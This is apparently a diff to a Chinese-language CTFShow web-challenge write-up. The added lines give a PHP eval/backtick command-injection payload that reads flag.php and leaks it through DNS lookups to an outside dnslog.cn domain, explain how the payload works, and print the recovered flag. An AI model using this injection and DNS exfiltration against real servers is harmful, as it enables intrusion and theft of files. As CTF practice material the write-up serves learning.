@@ -94,10 +94,19 @@ pyload:`?username=admin&code=admin&password=1;`
 
 ![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783564626435_image.png)
 
+?F=`$F`; ping`cat flag.php|grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1
+前六个字符刚好是``` `$F`;空格  ```  截取之后就变为``` eval('`$F`; ');```  在 PHP 里，反引号是执行 shell 命令，类似：`shell_exec($F);` 关键这里：`$F` 在 `eval` 的作用域里仍然是原始完整 GET 参数
+``` `$F`; ping`cat flag.php|grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1```
 
+只是一次命令替换。通常 shell 环境变量 F 为空，所以它基本不产生有效输出；后面的 ; 结束这一段。接着 shell 继续执行：``ping `cat flag.php | grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.4fy7r6.dnslog.cn -c 1``
 
+http://www.dnslog.cn/   可以获得一个测试域名，二级域名有限制需要对`cat flag.php`的结果进行修改
+`grep ctfshow`对cat输出的内容，找到含有ctfshow的哪一行，`tr -cd"[a-z]"/"0-9"`tr是字符转换删除工具，-c表示取反（除了指定字符以外的字符）-d表示删除  `删除所有不是小写字母、数字等指定集合里的字符`完了之后拼接，ping触发DNS查询，DNS 平台就能看到这个子域名，从而带出结果
+8-4-4-4-12
+ctfshow{1f1e2060-0e05-44ac-9491-b89f4dc3b1a9}
 
-
+# **134**
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783591860132_image.png)
 
 
 
